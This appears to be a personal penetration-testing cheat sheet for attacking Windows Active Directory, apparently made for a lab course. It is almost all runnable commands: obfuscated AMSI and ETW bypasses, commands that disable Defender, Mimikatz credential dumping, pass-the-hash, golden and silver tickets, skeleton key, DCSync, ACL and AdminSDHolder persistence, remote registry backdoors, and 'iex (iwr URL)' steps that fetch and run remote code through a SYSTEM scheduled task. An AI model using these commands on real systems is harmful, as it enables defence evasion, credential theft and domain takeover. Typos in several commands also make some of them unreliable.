**Glossary**

***Security bypass***

> Policy bypass
>
> > ``

> ***Disable Defender*** 
>
> > ```powershell
> > Set-MpPreference -DisableIOAVProtection $true
> > Set-MpPreference -DisableRealtimeMonitoring $true
> > Set-MpPreference -DisableBehaviorMonitoring $true
> > Set-MpPreference -DisableIntrusionPreventionSystem $true
> > Set-MpPreference -DisablePrivacyMode $true
> > ```

> ***AMSI Bypass*** 
>
> > ```powershell
> > sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
> > ```
> >
> > ```{powershell}
> > (({}).gettype())."aSs`emblY"."Getty`PE"(('System.Manage'+'ment.Automati'+'on.Trac'+'ing.P'+'SEtwL'+'og'+'Pro'+'vi'+'d'+'e'+'r'))."gEtf`ieLD"(('etwProvi'+'de'+'r'),('Non'+'P'+'ublic,Static'))."Se`TVAL`Ue"($null,(New-Object System.Diagnostics.Eventing.EventProvider(New-Guid)))
> > ```
> >
> > ```{powershell}
> > [ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
> > ```
> >
> > 

***Run after each ticket forge*** 

> ```powershell
> klist
> 
> Invoke-mimikatz -Command '"sekurlsa::pth /domain:<DomainControllerName> /user:<username> /ntlm:<CapturedValue> /run:powershell.exe"'
> 
> Invoke-Mimkatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAINNAMEFQDN> /sid:<Domain SID> /krbtgt:<RC4 NTLM HASH>  /ptt"'
> 
> Invoke-Mimkatz -Command '"kerberos::golden /domain:<DOMAINNAMEFQDN> /sid:<Domain SID> /target:<server FQDN> /service:<ServiceName> /rc4:<RC4 NTLM HASH>  /User:Administrator  /ptt"'
> 
> ```

***Download File***

> ```powershell
> iex (iwr URL)
> ```
>
> 



**Enumeration**



**Local Privs Escalation**

>  Current Domain where current user has local admin access 
>
> > ```powershell
> > Find-LocalAdminAccess -Verbose 
> > 
> > Invoke-CheckLocalAdminAccess
> > ```

>   In case RPC and SMB are blocked 
>
> > ```powershell
> > Find-WMILocalAdminAccess.ps1
> > 
> > Find-PSRemotingLocalAdminAccess.ps1
> > 
> > Invoke-EnumerateLocalAdmin -Verbose <!--Local Admin on non Domain Controller machine --> Get-NetComputer then Get-NetLocalGroup
> > ```

> Hunting session for domain admins 

> > ```powershell
> > Invoke-UserHunter
> > 
> > Invoke-UserHunter -Stealth
> > ```

> Hunting Group Users sessions 
>
> > `Inoke-User-Hunter -GroupName "<GroupName>"`

> Confirm Admin Access 
>
> > `Invoke-UserHunter -CheckAcces`

> List unquoted paths 
>
> > `Get-ServiceUnquoted -Verbose` 

> Current user can write to binary path 
>
> > `Get-ModifiableServiceFile -Verbose `

> Get services whose configuration can be modified by the current user 
>
> > `Get-ModifiableService -Verbose`

> BloodHund Exec 

> > `Invoke-BloodHund -CollectionMethods All` **Then**
> >
> > `Invoke-BloodHund -CollectionMethods All -ExcludeDC` 

**Remote command Execution**

> ```
> $sess = New-PSSession -ComputerName Server1
> 
> Invoke-Command -Session $sess -ScriptBlock{$proc = Get-Process}
> 
> Invoke-Command -Session $sess -FilePAth C:\AD\Tools\XX.ps1
> 
> Invoke-Command -Session $sess -ScriptBlock {$Proc.Name}
> 
> Enter-PSSession -Session $sess
> ```

> ***Run on Multiple Machines*** 
>
> > `Invoke-Command -FilePath C:\DDFDF.ps1 -ComputerName (Get-Content ServerList.File)`

***Privs Escalation***

> :one: ***Kerberoast***
>
> > :information_desk_person: Offline password decryption : save ticket on HDD and try to decrypt the ticket 
> >
> > :bulb: **ServicePrincipalName** ***is not null*** if the used account is a **services account**
> >
> > ***Powerview***
> >
> > ```powershell
> > Get-NetUser -SPN
> > ```
> >
> > ***AD module***
> >
> > ```powershell
> > Get-ADUser -Filter {ServicePrinicpalName -ne "$null"} -Properties ServicePrinicpalName
> > ```
> >
> > 
> >
> > 

***Persistence*** <u>Mimikatz at rescue:</u>

> :one: ***Dumb Creds*** 
>
> > :one::a:`Invoke-Mimikatz -DumpCreds `

> :two: ***KRBTGT***
>
> > Get ***krbtgt*** from DC as Domain admin  
> >
> > :two::b: `Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc`

> :three: ***DCSync*** attack to extract ***krbtgt*** using Domain Admin privs
>
> > :three: :a: `Invoke-Command -Command '"lsadump::dcsync /user:<DOMAINNAME>\krbtgt"' `

> :four: ***Golden Ticket*** -- krbtgt NTLM is key of encryption (TGS)
>
> > Fork a ticket from any machine `Invoke-Mimkatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAINNAMEFQDN> /sid:<Domain SID> /krbtgt:<RC4 NTLM HASH>  /ptt"'`
> >
> > ***Clone Someone Ticket***  
> >
> > > :four::a: `Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:<domainName> /ntlm:<hash> /run:powershell.exe"'`

> :five: ***Sliver Tickets*** -- Service account NTLM value is key of encryption (TGS)

> > Dump Services RC4 {RID:1000, User:DCORP-DC$} 
> >
> > :five::a:`Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc`
> >
> > :five::b: `Invoke-Mimkatz -Command '"kerberos::golden /domain:<DOMAINNAMEFQDN> /sid:<Domain SID> /target:<server FQDN> /service:<ServiceName> /rc4:<RC4 NTLM HASH>  /User:Administrator  /ptt"'`
> >
> > :information_source: `Host -> to start schdule ` , `cifs -> explorer file system`
> >
> > ***Use Sliver Ticket to run task*** 
> >
> > >  ```
> > > schtasks /create /S <DomainNAme> /SC Weekly /RU "NT Authority\SYSTEM" /TN "<TaskNAme>" /TR "<Task action>"
> > >  ```
> > >
> > > `/TR "powershell.exe -c 'iex(iwr URL)'"`
> > >
> > > Run Task
> > >
> > > > `schtasks /Run /S <DomainName> /TN "TASKNAME"`

> :six: ***Skeleton Key*** -- Patch Lsass by injecting Skeleton key to access any resources (Password: mimikatz) **DC not rebooted**

> > Domain Admin is required 
> >
> > `Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DomainNAmeFQDN>` **Then**
> >
> > `Enter-PSSEssion -ComputerName <DomainController> -credential <domain>\Administrator`
> >
> > ***Protected Lsass*** -- Copy mimidriv.sys on the target's hard disk
> >
> > > ```
> > > mimikatz # privilege::debug
> > > 
> > > mimikatz # !+
> > > 
> > > mimikatz # !processprotect /process:lsass.exe /remove
> > > 
> > > mimikatz # misc::skeleton
> > > 
> > > mimikatz # !-
> > > ```
>
> :seven: ***DSRM*** -- Safe mode of any domain controller -- Directory Services Restore Mode ***SafeModePassword***  -- Rarely change
>
> > :information_source: Local Administrator's password on DC ( different from RID:500) 
> >
> > :rotating_light: Domain Admin Access Required
> >
> > ```
> > Invoke-mimikatz -Command '"token::elevate" "lsadump::sam"' - ComputerName <DomainControlerFQDN>
> > ```
> >
> > ***Then*** Change logon behavior to the local admin account by adding ***Hive*** 
> >
> > > `Enter-PSSession -ComputerName <DomainControllerFQDN> `
> > >
> > > **Then**
> > >
> > > `New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`
> > >
> > > **Validate Changes**
> > >
> > > `Get-ItemProperty "HKLM:\System\CurrentConrtolSet\Control\Lsa\"`
> >
> > **Then** You can use the following command to gain access 
> >
> > ```
> > Invoke-mimikatz -Command '"sekurlsa::pth /domain:<DomainControllerName> /user:Administrator /ntlm:<CapturedValuePreviously> /run:powershell.exe"'
> > ```
> >
> > Access Directory `ls \\domainControllerName\C$`
>
> :eight: ***Security Support Provider*** -- DLL file allows the application to obtain authenticated connection 
>
> > Supported SSP Packages are NTLM, Kerberos, Wdigest, CredSSP
> >
> > mimilib.dll is a custom SSP do a keylogger for accounts passwords in clear text on target server 
> >
> > > :a: ***Injecting to LSASS*** -- Not Stable 
> > >
> > > ```
> > > Invoke-mimikatz -Command '"misc::memssp"'
> > > ```
> >
> > > :b: ***Drops mimilib.dll in System32 then add Hive***
> > >
> > > ```
> > > $package = Get-ItemProperty HKLM:\SYSTEM\CurrentContolSet\Control\Lsa\osconfig -Name 'Security Packages'| select-ExpandProperty 'Security Packages'
> > > 
> > > $package+="mimilib"
> > > 
> > > Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\osconfig\ -Name 'Security PAckages' -Value $package
> > > 
> > > Set-ItemProperty HKLM:\SYSTEM\CureentControlSet\Control\Lsa\ -Name 'Security PAckages' -Value $package
> > > ```
> > >
> > > :rotating_light: **Logs @ C:\Windows\System32\kiwissp.log**
>
> :nine: ***ACLs***
>
> > :nine: :a: ***AdminSDHolder*** : Control the permissions using an ACL for Protected Group [Static Values of ACL]
> >
> > > Security Descriptor Propagator (SDPROP) runs every hour overwritten on object ACL by comparing the ACL of protected groups and members with the ACL of AdminSDHolder 
> > >
> > >   :information_source: Add your account in the AdminSDHolder gives persistence 
> > >
> > > ***Add Full Permission for a user in AdminSDHolder*** 
> > >
> > > Need Domain Admin :rotating_light: privs to execute :point_down:
> > >
> > > > **PowerView**  
> > > >
> > > > > ```
> > > > > add-objectACL -TargetADSprefix 'CN=AdminSDHolder,CN=System'-PrincipalSamAccountName <YOUR account> -Rights All -Verbose
> > > > > ```
> > > >
> > > > ***ACTIVE Directory***
> > > >
> > > > > :one:`Import-Module Microsoft.ActiveDirectory.Management.dll`
> > > > >
> > > > > :two:`Import-Module ActiveDirectory.psd1`
> > > > >
> > > > > :three: `Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Pricipal <accountNAme> -Verbose `
> > > > >
> > > > > :four: **Run Propagator**
> > > > >
> > > > > > ```
> > > > > > $sess = New-PSSession -ComputerName DomainDC
> > > > > > 
> > > > > > Invoke-Command -FilePAth .\Invoke-SDPropagator.ps1 -Session $sess
> > > > > > 
> > > > > > Enter-PSSEssion -Session $sess
> > > > > > 
> > > > > > Invoke-SDPropagator -showProgress -timeoutMinutes 1
> > > > > > ```
> > > > >
> > > > > :five: Validate ACL 
> > > > >
> > > > > > ```
> > > > > > . .\Powerview.ps1
> > > > > > 
> > > > > > Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match '<accountNAme>'}
> > > > > > ```
> > > > >
> > > > > :six: Abuse it
> > > > >
> > > > > > **Add Member to Group** 
> > > > > >
> > > > > > > **AD Module**
> > > > > > >
> > > > > > > > ```
> > > > > > > > Add-ADGroupMember -Identity 'Domain Admins' -Members <AccountName>
> > > > > > > > ```
> > > > > >
> > > > > > > **PowerView_dev**
> > > > > > >
> > > > > > > > ```
> > > > > > > > Add-DomainGroupMember -Identity 'Domain Admins' -Members <AccountName> -Verbose
> > > > > > > > ```
> > > > > >
> > > > > > > **Verify**
> > > > > > >
> > > > > > > > ```
> > > > > > > > Get-ADUser -Identity <AccountNAme>
> > > > > > > > 
> > > > > > > > Get-ADGroupMember -Identity 'domain admins
> > > > > > > > ```
> > > > > >
> > > > > > **Reset Account Password**
> > > > > >
> > > > > > >  **AD Module**
> > > > > > >
> > > > > > > > ```
> > > > > > > > Set-ADAccountPAssword -Identity <AccountNAme> -NewPAssword (ConvertTo-SecureString 'PASSME#!0rd' -AsPlainText -Force) -Verbose
> > > > > > > > ```
> > > > > > >
> > > > > > > **PowerView_dev**
> > > > > > >
> > > > > > > > ```
> > > > > > > > Set-DomainUserPAssword -Identity <AccountNAme> -AccountPAssword (ConvertTo-SecureString 'P@ssw0rdM3!' -AsPlainText -Force) -Verbose
> > > > > > > > ```
> >
> > :nine::b: **Domain Object ACL**
> >
> > > :nine::b::one: **PowerView_dev** 
> > >
> > > > ```
> > > > Add-ObjectACL -TargetDistinguishedNAme 'DC=dollarcorp,DC=monrycorp,DC=local' -PrincipaleSamAccountNAme <AccountNAme> -Rights All -Verbose
> > > > ```
> > > >
> > > > **OR** add **DCSync** rights only 
> > > >
> > > > > ```
> > > > > Add-ObjectACL -TargetDistinguishedNAme 'DC=dollarcorp,DC=monrycorp,DC=local' -PrincipaleSamAccountNAme <AccountNAme> -Rights DCSync -Verbose
> > > > > ```
> > >
> > > :nine::b: :two: **AD Module**
> > >
> > > > ```
> > > > Set-ADACL -DistinguishedNAme 'DC=dollarcorp,DC=monrycorp,DC=local' -Principale <accountNAme> -Verbose
> > > > ```
> > > >
> > > > **OR** add **DCSync** rights only 
> > > >
> > > > > ```
> > > > > Set-ADACL -DistinguishedNAme 'DC=dollarcorp,DC=monrycorp,DC=local' -Principale <accountNAme> -GUIDRight DCSync -Verbose
> > > > > ```
> > >
> > > :nine: :b: :runner:**Abuse**
> > >
> > > > :a: `Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\Administrator"'`
> > > >
> > > > :b: `Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`
> >
> > :nine:**C** ***Modify Security Descriptor of multiple remote access methods***
> >
> > > :information_source: Domain Administrative privileges are required 
> > >
> > > :bulb: Security Descriptor Definition Language **SDDL** use **ACE strings** 
> > >
> > > :information_desk_person: ACE for built-in **Administrator** for WMI namespace `A;CI;CCDCLCSWRPWPRCWD;;;SID`
> > >
> > > :bulb: Two point of interest here are : COM security Component ACL in `component services` including subsequences namespaces and Namespace in  ACL `computer management`
> > >
> > > **Test Payload**  
> > >
> > > ```
> > > Get-WMIobject -class win32_operatingsystem -ComputerName <domainFQDN> 
> > > ```
> > >
> > > > **ACL modification**
> > > >
> > > > > ```
> > > > > . .\Set-RemoteWMI.ps1
> > > > > ```
> > > > >
> > > > >  **Add permissions - Run on Local Machine**
> > > > >
> > > > > >  ```powershell
> > > > > > Set-RemoteWMI -UserNAme <username> -Verbose
> > > > > >  ```
> > > > >
> > > > > **Add permissions - Run on remote machine **
> > > > >
> > > > > > ```powershell
> > > > > > Set-RemoteWMI -UserName <username> -ComputerName <computerNAme> -nameSpace 'root\cimv2' -Verbose
> > > > > > ```
> > > > >
> > > > > **Add permissions - Run on remote machine with specific credentials**
> > > > >
> > > > > > ```powershell
> > > > > > Set-RemoteWMI -UserName <username> -ComputerName <computerNAme> -nameSpace 'root\cimv2' -Credential Administrator -Verbose
> > > > > > ```
> > > > >
> > > > > **Remove permissions remotely**
> > > > >
> > > > > > ```powershell
> > > > > > Set-RemoteWMI -UserName <username> -ComputerName <computerNAme> -nameSpace 'root\cimv2' -Remote -Verbose
> > > > > > ```
> > > > >
> > > > > ***Execute Remote Command using PS session***
> > > > >
> > > > > ```powershell
> > > > > .. .\Set-RemotePSRemoting.ps1
> > > > > Set-RemotePSRemoting -UserNAme <username> -ComputerName <domainFQDN> -Verbose 
> > > > > ```
> > > > >
> > > > > ***Validation command***
> > > > >
> > > > > ```powershell
> > > > > Invoke-Command -ScriptBlock{whoami;} -ComputerName <DCFQDN>
> > > > > ```
> > > >
> > > > ***Remote Registry modification***
> > > >
> > > > > USE ***DAMP*** with admin privs on remote machine 
> > > > >
> > > > > ```powershell
> > > > > . .\Add-RemoteBackoor.ps1
> > > > > 
> > > > > Add-RemoteRegBackdoor -ComputerName <computerNAme> -Trustee <username> -Verbose 
> > > > > ```
> > > > >
> > > > > ***Abuse***
> > > > >
> > > > > > :information_desk_person: replace $IV by $initIV 
> > > > > >
> > > > > > ```powershell
> > > > > > . .\RemoteHAshRetrival.ps1 
> > > > > > ```
> > > > > >
> > > > > > **Retrieve machine account hash**
> > > > > >
> > > > > > ```powershell
> > > > > > Get-RemoteMAchineAccountHash -ComputerName <computerName> -Verbose
> > > > > > ```
> > > > > >
> > > > > > ***Retrieve local account hash*** --DSRM password in case DomainControler ComputerName
> > > > > >
> > > > > > ```powershell
> > > > > > Get-RemoteLocalAccountHash -ComputerName <computerNAme> -Verbose
> > > > > > ```
> > > > > >
> > > > > > ***Retrieve domain cached credentials***
> > > > > >
> > > > > > ```powershell
> > > > > > Get-RemoteCachedCredential -ComputerName <computerName> -Verbose 
> > > > > > ```



**Scripts**

> Powerup Tutorial 
>
> `https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/`

> Jenkines
>
> > RCE Exec in scripts  http://www.labofapenetrationtester.com/2014/06/hacking-jenkins-servers.html
> >
> > Building Job 
> >
> > http://www.labofapenetrationtester.com/2014/08/script-execution-and-privilege-esc-jenkins.html
> >
> > http://www.labofapenetrationtester.com/2015/11/week-of-continuous-intrusion-day-1.html



![image-20210208002523916](C:\Users\muhammed.bassem\AppData\Roaming\Typora\typora-user-images\image-20210208002523916.png)







